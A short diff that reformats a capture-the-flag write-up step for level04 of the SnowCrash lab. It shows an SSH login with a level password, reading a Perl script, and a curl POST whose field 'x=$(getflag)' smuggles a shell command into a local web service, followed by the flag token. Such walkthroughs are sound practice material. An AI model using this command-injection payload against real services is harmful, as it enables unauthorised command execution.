@@ -1,4 +1,8 @@
-🔻 Hack
-⬇️ cat level04.pl
-⬇️ curl -X POST -d 'x=$(getflag)' localhost:4747
-👉 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap 
++ ---- 🔻 Hack -------
+|
+|   ssh level04@$SNOW_CRASH_IP -p 4242
+|   └ qi0maab88jeaj46qoumi7maus
+|   cat level04.pl
+|   curl -X POST -d 'x=$(getflag)' localhost:4747
+|   Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+|
